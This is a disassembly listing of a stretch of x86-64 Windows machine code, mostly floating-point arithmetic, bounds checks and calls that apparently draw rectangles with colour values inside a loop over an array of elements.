   140005285:	f3 43 0f 58 34 c1    	addss  (%r9,%r8,8),%xmm6
   14000528b:	66 0f 6e e0          	movd   %eax,%xmm4
   14000528f:	49 8b 85 b0 48 00 00 	mov    0x48b0(%r13),%rax
   140005296:	0f 5b e4             	cvtdq2ps %xmm4,%xmm4
   140005299:	0f 28 c6             	movaps %xmm6,%xmm0
   14000529c:	f3 45 0f 59 dc       	mulss  %xmm12,%xmm11
   1400052a1:	f3 43 0f 58 64 c1 04 	addss  0x4(%r9,%r8,8),%xmm4
   1400052a8:	f3 0f 59 c5          	mulss  %xmm5,%xmm0
   1400052ac:	f3 44 0f 11 4c 24 48 	movss  %xmm9,0x48(%rsp)
   1400052b3:	f3 45 0f 58 d9       	addss  %xmm9,%xmm11
   1400052b8:	f3 0f 11 45 88       	movss  %xmm0,-0x78(%rbp)
   1400052bd:	f3 0f 58 d4          	addss  %xmm4,%xmm2
   1400052c1:	41 0f 28 c0          	movaps %xmm8,%xmm0
   1400052c5:	0f 28 dc             	movaps %xmm4,%xmm3
   1400052c8:	f3 41 0f 59 5c 24 4c 	mulss  0x4c(%r12),%xmm3
   1400052cf:	f3 0f 58 c6          	addss  %xmm6,%xmm0
   1400052d3:	f3 0f 58 35 c9 2f 04 	addss  0x42fc9(%rip),%xmm6        # 0x1400482a4
   1400052da:	00 
   1400052db:	f3 41 0f 59 54 24 4c 	mulss  0x4c(%r12),%xmm2
   1400052e2:	f3 0f 59 c5          	mulss  %xmm5,%xmm0
   1400052e6:	f3 0f 11 55 94       	movss  %xmm2,-0x6c(%rbp)
   1400052eb:	f3 0f 58 ce          	addss  %xmm6,%xmm1
   1400052ef:	f3 0f 11 55 a4       	movss  %xmm2,-0x5c(%rbp)
   1400052f4:	41 0f 28 d2          	movaps %xmm10,%xmm2
   1400052f8:	f3 0f 11 45 90       	movss  %xmm0,-0x70(%rbp)
   1400052fd:	f3 0f 58 d7          	addss  %xmm7,%xmm2
   140005301:	f3 0f 11 5d 8c       	movss  %xmm3,-0x74(%rbp)
   140005306:	0f 28 c6             	movaps %xmm6,%xmm0
   140005309:	f3 0f 11 5d 9c       	movss  %xmm3,-0x64(%rbp)
   14000530e:	f3 0f 59 c5          	mulss  %xmm5,%xmm0
   140005312:	f3 0f 59 cd          	mulss  %xmm5,%xmm1
   140005316:	f3 0f 11 45 98       	movss  %xmm0,-0x68(%rbp)
   14000531b:	f3 41 0f 59 d4       	mulss  %xmm12,%xmm2
   140005320:	f3 0f 11 4d a0       	movss  %xmm1,-0x60(%rbp)
   140005325:	49 8b 0c 07          	mov    (%r15,%rax,1),%rcx
   140005329:	f3 41 0f 58 d5       	addss  %xmm13,%xmm2
   14000532e:	f3 0f 10 59 08       	movss  0x8(%rcx),%xmm3
   140005333:	f3 0f 10 49 04       	movss  0x4(%rcx),%xmm1
   140005338:	0f 28 c3             	movaps %xmm3,%xmm0
   14000533b:	f3 0f 58 41 10       	addss  0x10(%rcx),%xmm0
   140005340:	41 0f 2f c5          	comiss %xmm13,%xmm0
   140005344:	0f 86 89 02 00 00    	jbe    0x1400055d3
   14000534a:	0f 2f d3             	comiss %xmm3,%xmm2
   14000534d:	0f 86 80 02 00 00    	jbe    0x1400055d3
   140005353:	0f 28 c1             	movaps %xmm1,%xmm0
   140005356:	f3 0f 58 41 0c       	addss  0xc(%rcx),%xmm0
   14000535b:	41 0f 2f c1          	comiss %xmm9,%xmm0
   14000535f:	0f 86 6e 02 00 00    	jbe    0x1400055d3
   140005365:	44 0f 2f d9          	comiss %xmm1,%xmm11
   140005369:	0f 86 64 02 00 00    	jbe    0x1400055d3
   14000536f:	4c 8d 05 32 c7 03 00 	lea    0x3c732(%rip),%r8        # 0x140041aa8
   140005376:	ba 01 00 00 00       	mov    $0x1,%edx
   14000537b:	e8 c0 1b 00 00       	call   0x140006f40
   140005380:	49 8b 7c 24 08       	mov    0x8(%r12),%rdi
   140005385:	48 8b c8             	mov    %rax,%rcx
   140005388:	48 8b d7             	mov    %rdi,%rdx
   14000538b:	48 8b d8             	mov    %rax,%rbx
   14000538e:	e8 fd e8 01 00       	call   0x140023c90
   140005393:	41 0f 28 c0          	movaps %xmm8,%xmm0
   140005397:	c7 44 24 30 00 00 00 	movl   $0x30000000,0x30(%rsp)
   14000539e:	30 
   14000539f:	f3 41 0f 58 c7       	addss  %xmm15,%xmm0
   1400053a4:	41 0f 28 fa          	movaps %xmm10,%xmm7
   1400053a8:	f3 41 0f 58 fe       	addss  %xmm14,%xmm7
   1400053ad:	41 0f 28 f4          	movaps %xmm12,%xmm6
   1400053b1:	f3 41 0f 59 f6       	mulss  %xmm14,%xmm6
   1400053b6:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
   1400053ba:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400053bf:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   1400053c4:	48 8d 45 98          	lea    -0x68(%rbp),%rax
   1400053c8:	48 8b d7             	mov    %rdi,%rdx
   1400053cb:	f3 41 0f 59 c4       	mulss  %xmm12,%xmm0
   1400053d0:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   1400053d5:	48 8b cb             	mov    %rbx,%rcx
   1400053d8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400053dd:	f3 41 0f 59 fc       	mulss  %xmm12,%xmm7
   1400053e2:	f3 41 0f 58 f5       	addss  %xmm13,%xmm6
   1400053e7:	f3 41 0f 58 c1       	addss  %xmm9,%xmm0
   1400053ec:	f3 41 0f 58 fd       	addss  %xmm13,%xmm7
   1400053f1:	f3 0f 11 74 24 64    	movss  %xmm6,0x64(%rsp)
   1400053f7:	f3 0f 11 44 24 58    	movss  %xmm0,0x58(%rsp)
   1400053fd:	41 0f 28 c1          	movaps %xmm9,%xmm0
   140005401:	f3 41 0f 58 c4       	addss  %xmm12,%xmm0
   140005406:	f3 0f 11 7c 24 5c    	movss  %xmm7,0x5c(%rsp)
   14000540c:	f3 0f 11 44 24 60    	movss  %xmm0,0x60(%rsp)
   140005412:	e8 99 13 02 00       	call   0x1400267b0
   140005417:	41 0f 28 c4          	movaps %xmm12,%xmm0
   14000541b:	c7 44 24 30 00 00 00 	movl   $0x30000000,0x30(%rsp)
   140005422:	30 
   140005423:	f3 41 0f 58 c4       	addss  %xmm12,%xmm0
   140005428:	f3 44 0f 11 5c 24 68 	movss  %xmm11,0x68(%rsp)
   14000542f:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
   140005433:	f3 0f 11 7c 24 6c    	movss  %xmm7,0x6c(%rsp)
   140005439:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000543e:	4c 8d 4c 24 68       	lea    0x68(%rsp),%r9
   140005443:	48 8d 45 98          	lea    -0x68(%rbp),%rax
   140005447:	f3 0f 11 74 24 74    	movss  %xmm6,0x74(%rsp)
   14000544d:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140005452:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005457:	f3 41 0f 58 c1       	addss  %xmm9,%xmm0
   14000545c:	48 8b d7             	mov    %rdi,%rdx
   14000545f:	48 8b cb             	mov    %rbx,%rcx
   140005462:	f3 0f 11 44 24 70    	movss  %xmm0,0x70(%rsp)
   140005468:	e8 43 13 02 00       	call   0x1400267b0
   14000546d:	48 8b b3 98 00 00 00 	mov    0x98(%rbx),%rsi
   140005474:	f3 45 0f 59 c4       	mulss  %xmm12,%xmm8
   140005479:	f3 45 0f 59 d4       	mulss  %xmm12,%xmm10
   14000547e:	f3 45 0f 58 c1       	addss  %xmm9,%xmm8
   140005483:	f3 45 0f 58 d5       	addss  %xmm13,%xmm10
   140005488:	f3 44 0f 11 44 24 78 	movss  %xmm8,0x78(%rsp)
   14000548f:	f3 44 0f 11 54 24 7c 	movss  %xmm10,0x7c(%rsp)
   140005496:	48 3b fe             	cmp    %rsi,%rdi
   140005499:	74 0b                	je     0x1400054a6
   14000549b:	48 8b d7             	mov    %rdi,%rdx
   14000549e:	48 8b cb             	mov    %rbx,%rcx
   1400054a1:	e8 ea e7 01 00       	call   0x140023c90
   1400054a6:	ba 06 00 00 00       	mov    $0x6,%edx
   1400054ab:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400054b1:	48 8b cb             	mov    %rbx,%rcx
   1400054b4:	e8 57 e8 01 00       	call   0x140023d10
   1400054b9:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
   1400054bd:	c7 44 24 28 00 00 00 	movl   $0xff000000,0x28(%rsp)
   1400054c4:	ff 
   1400054c5:	4c 8d 4d 98          	lea    -0x68(%rbp),%r9
   1400054c9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400054ce:	4c 8d 44 24 78       	lea    0x78(%rsp),%r8
   1400054d3:	48 8b cb             	mov    %rbx,%rcx
   1400054d6:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   1400054db:	e8 50 e9 01 00       	call   0x140023e30
   1400054e0:	48 3b fe             	cmp    %rsi,%rdi
   1400054e3:	74 2a                	je     0x14000550f
   1400054e5:	48 63 4b 68          	movslq 0x68(%rbx),%rcx
   1400054e9:	8d 41 ff             	lea    -0x1(%rcx),%eax
   1400054ec:	89 43 68             	mov    %eax,0x68(%rbx)
   1400054ef:	85 c0                	test   %eax,%eax
   1400054f1:	75 04                	jne    0x1400054f7
   1400054f3:	33 c0                	xor    %eax,%eax
   1400054f5:	eb 09                	jmp    0x140005500
   1400054f7:	48 8b 43 70          	mov    0x70(%rbx),%rax
   1400054fb:	48 8b 44 c8 f0       	mov    -0x10(%rax,%rcx,8),%rax
   140005500:	48 8b cb             	mov    %rbx,%rcx
   140005503:	48 89 83 98 00 00 00 	mov    %rax,0x98(%rbx)
   14000550a:	e8 51 e5 01 00       	call   0x140023a60
   14000550f:	48 8b b3 98 00 00 00 	mov    0x98(%rbx),%rsi
   140005516:	f3 44 0f 11 45 80    	movss  %xmm8,-0x80(%rbp)
   14000551c:	f3 44 0f 11 55 84    	movss  %xmm10,-0x7c(%rbp)
   140005522:	48 3b fe             	cmp    %rsi,%rdi
   140005525:	74 0b                	je     0x140005532
   140005527:	48 8b d7             	mov    %rdi,%rdx
   14000552a:	48 8b cb             	mov    %rbx,%rcx
   14000552d:	e8 5e e7 01 00       	call   0x140023c90
   140005532:	ba 06 00 00 00       	mov    $0x6,%edx
   140005537:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   14000553d:	48 8b cb             	mov    %rbx,%rcx
   140005540:	e8 cb e7 01 00       	call   0x140023d10
   140005545:	48 8d 45 90          	lea    -0x70(%rbp),%rax
   140005549:	c7 44 24 28 ff ff ff 	movl   $0xffffffff,0x28(%rsp)
   140005550:	ff 
   140005551:	4c 8d 4d 88          	lea    -0x78(%rbp),%r9
   140005555:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000555a:	4c 8d 45 80          	lea    -0x80(%rbp),%r8
   14000555e:	48 8b cb             	mov    %rbx,%rcx
   140005561:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   140005566:	e8 c5 e8 01 00       	call   0x140023e30
   14000556b:	48 3b fe             	cmp    %rsi,%rdi
   14000556e:	74 2a                	je     0x14000559a
   140005570:	48 63 4b 68          	movslq 0x68(%rbx),%rcx
   140005574:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140005577:	89 43 68             	mov    %eax,0x68(%rbx)
   14000557a:	85 c0                	test   %eax,%eax
   14000557c:	75 04                	jne    0x140005582
   14000557e:	33 c0                	xor    %eax,%eax
   140005580:	eb 09                	jmp    0x14000558b
   140005582:	48 8b 43 70          	mov    0x70(%rbx),%rax
   140005586:	48 8b 44 c8 f0       	mov    -0x10(%rax,%rcx,8),%rax
   14000558b:	48 8b cb             	mov    %rbx,%rcx
   14000558e:	48 89 83 98 00 00 00 	mov    %rax,0x98(%rbx)
   140005595:	e8 c6 e4 01 00       	call   0x140023a60
   14000559a:	48 63 4b 68          	movslq 0x68(%rbx),%rcx
   14000559e:	8d 41 ff             	lea    -0x1(%rcx),%eax
   1400055a1:	89 43 68             	mov    %eax,0x68(%rbx)
   1400055a4:	85 c0                	test   %eax,%eax
   1400055a6:	75 04                	jne    0x1400055ac
   1400055a8:	33 c0                	xor    %eax,%eax
   1400055aa:	eb 09                	jmp    0x1400055b5
   1400055ac:	48 8b 43 70          	mov    0x70(%rbx),%rax
   1400055b0:	48 8b 44 c8 f0       	mov    -0x10(%rax,%rcx,8),%rax
   1400055b5:	48 8b cb             	mov    %rbx,%rcx
   1400055b8:	48 89 83 98 00 00 00 	mov    %rax,0x98(%rbx)
   1400055bf:	e8 9c e4 01 00       	call   0x140023a60
   1400055c4:	f3 0f 10 3d 3c 2c 04 	movss  0x42c3c(%rip),%xmm7        # 0x140048208
   1400055cb:	00 
   1400055cc:	4c 8d 0d fd 0c 04 00 	lea    0x40cfd(%rip),%r9        # 0x1400462d0
   1400055d3:	44 8b 44 24 40       	mov    0x40(%rsp),%r8d
   1400055d8:	41 ff c6             	inc    %r14d
   1400055db:	49 83 c7 08          	add    $0x8,%r15
   1400055df:	45 3b b5 a8 48 00 00 	cmp    0x48a8(%r13),%r14d
   1400055e6:	0f 8c 04 fc ff ff    	jl     0x1400051f0
   1400055ec:	44 0f 28 bc 24 b0 00 	movaps 0xb0(%rsp),%xmm15
   1400055f3:	00 00 
   1400055f5:	44 0f 28 b4 24 c0 00 	movaps 0xc0(%rsp),%xmm14
   1400055fc:	00 00 
   1400055fe:	44 0f 28 ac 24 d0 00 	movaps 0xd0(%rsp),%xmm13
